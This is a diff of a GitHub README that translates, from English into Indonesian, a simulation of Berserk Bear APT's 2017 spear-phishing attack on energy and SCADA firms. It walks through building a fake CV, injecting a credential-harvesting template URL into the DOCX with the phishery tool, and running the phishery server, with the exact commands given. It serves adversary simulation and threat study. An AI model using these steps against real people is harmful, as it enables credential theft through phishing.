@@ -1,64 +1,50 @@
-# Berserk Bear APT Adversary Simulation
-This is a simulation of attack by (Berserk Bear) APT group targeting critical infrastructure and energy companies around the world, primarily in Europe and the United States, The attack campaign was active from least May 2017. This attack target both the critical infrastructure providers and the vendors those providers use to deliver critical services, the attack chain starts with malicious (XML container) Injected into DOCX file connected to external server over (SMB) used to silently harvest users credentials and was used in spear-phishing attack. I relied on ‏Cisco Talos Intelligence Group‏ tofigure out the details to make this simulation: https://blog.talosintelligence.com/template-injection/
+# Simulasi Serangan Berserk Bear APT
+
+Ini adalah simulasi serangan oleh grup APT (Berserk Bear) yang menargetkan infrastruktur kritis dan perusahaan energi di seluruh dunia, terutama di Eropa dan Amerika Serikat. Kampanye serangan ini aktif setidaknya sejak Mei 2017. Serangan ini menargetkan penyedia infrastruktur kritis dan vendor yang mereka gunakan untuk menyediakan layanan penting. Rantai serangan dimulai dengan **kontainer XML berbahaya** yang disuntikkan ke dalam file DOCX, yang terhubung ke server eksternal melalui (SMB) dan digunakan untuk diam-diam mengambil kredensial pengguna, lalu digunakan dalam serangan spear-phishing. Saya mengandalkan laporan dari [Cisco Talos Intelligence Group](https://blog.talosintelligence.com/template-injection/) untuk memahami detailnya dan membuat simulasi ini.
 
 ![imageedit_2_8052388982](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/3d592743-ea32-4f8e-9739-1d0696c1bfd2)
 
+Jika Anda ingin mengetahui lebih lanjut tentang serangan oleh grup APT Berserk Bear, lihat di sini: [ETDA Berserk Bear Card](https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Berserk%20Bear%2C%20Dragonfly%202%2E0&n=1)
 
-If you need to know more about Berserk Bear APT group attacks: https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Berserk%20Bear%2C%20Dragonfly%202%2E0&n=1
+Serangan ini meliputi beberapa tahap, termasuk penyuntikan file DOCX dan penggunaan kontainer XML berbahaya yang memicu notifikasi untuk memperoleh kredensial yang kemudian ditransfer ke server penyerang. Kredensial ini digunakan oleh penyerang untuk mengakses data organisasi yang menjadi target serangan spear-phishing. File DOCX berupa CV ini dibuat untuk orang dengan pengalaman sepuluh tahun dalam pengembangan perangkat lunak dan sistem kontrol SCADA.
 
-This attack included several stages including Injecting a DOCX file and using a malicious XML container that creates a specific alert to obtain credentials and is transferred to the attackers’ server, which in turn is used by them to obtain data for the organizations that were targeted by the spear-phishing attack. The DOCX file was a CV that was  Presented to a person with ten years of experience in software development and SCADA control systems.
+1. Buat file DOCX CV yang akan disuntikkan dan dikirim melalui spear phishing.
 
-1. Create CV DOCX file which will be injected and sent spear phishing.
+2. Lakukan penyuntikan pada file DOCX untuk memperoleh kredensial menggunakan alat phishery.
 
-2. Make injections into DOCX file to obtain credentials using the phishery tool.
-
-3. Credential Phishing is when the target opens the target Word file and enters credentials into the notification that will be shown to them.
-
+3. Phishing Kredensial terjadi ketika target membuka file Word dan memasukkan kredensial dalam notifikasi yang akan ditampilkan.
 
 
-## The first stage (delivery technique)
+## Tahap Pertama (teknik pengiriman)
 
-Since the attackers here wanted to target institutions related to energy and energy management systems such as SCADA, the attackers created a DOCX file in the form of a CV to apply for a job. It seems that there was a hiring open to work for such a position, and the attackers sent the CV that contained the malicious XML container, here i created a CV identical to the one they used in the actual attack.
+Penyerang menargetkan institusi yang terkait dengan energi dan sistem manajemen energi seperti SCADA. Mereka membuat file DOCX dalam bentuk CV untuk melamar pekerjaan, tampaknya ada lowongan pekerjaan terbuka untuk posisi tersebut. Penyerang mengirimkan CV yang berisi kontainer XML berbahaya. Di sini, saya membuat CV identik dengan yang digunakan dalam serangan asli.
 
 ![Screenshot from 2024-05-18 19-21-05](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0e13bdf-1816-41a9-99d8-4fc31d751aeb)
 
 
+## Tahap Kedua (teknik implantasi)
 
-
-## The Second stage (implanting technique)
-
-According to what Cisco Talos Intelligence Group said the attackers worked to inject the DOCX file via a phishery tool, this is because at the time of this attack it was a tool that had not been released for a long time and this is the point where the attackers took advantage of it the most and it is also possible that they made some modifications before using it in this attack.
-
-
+Menurut Cisco Talos Intelligence Group, penyerang menyuntikkan file DOCX melalui alat phishery. Pada saat serangan ini, phishery merupakan alat baru, dan para penyerang memanfaatkan momen tersebut. Mungkin mereka juga melakukan beberapa modifikasi sebelum menggunakannya dalam serangan ini.
 
 ![Screenshot from 2024-05-21 08-11-09](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0bcf631-779b-44d4-899b-b37646a0427f)
 
+Phishery adalah server HTTP yang sederhana dengan SSL, dirancang untuk tujuan utama phishing kredensial melalui Otentikasi Dasar. Phishery juga memungkinkan penyuntikan URL ke dalam dokumen Word (.docx) dengan mudah.
 
-
-Phishery is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication. Phishery also provides the ability easily to inject the URL into a .docx Word document.
-
-Github repository: https://github.com/ryhanson/phishery.git
-
+Repository Github: https://github.com/ryhanson/phishery.git
 
 ![photo_2024-05-28_08-22-20](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/847f8fea-3076-49bb-9703-0375f24e085b)
 
-
+Berikut adalah perintah untuk menginstal dan menggunakan phishery:
 `sudo apt-get install phishery`
 
 `phishery -u https://192.168.138.138 -i CV.docx -o malicious.docx`
 
 `phishery`
 
-Now the malicious CV will be sent to the target and wait for the Credentials.
+Sekarang, CV berbahaya akan dikirim ke target dan menunggu kredensial.
 
-## The third stage (execution technique)
+## Tahap Ketiga (teknik eksekusi)
 
-Credential Phishing is when the target opens the target Word file and enters credentials into the notification that will be shown to them.
-
+Phishing Kredensial terjadi ketika target membuka file Word yang berbahaya dan memasukkan kredensial dalam notifikasi yang akan ditampilkan kepada mereka.
 
 https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/ac654ad4-45d8-4bea-a0cb-a3a0fc7e567d
-
-
-
-
-
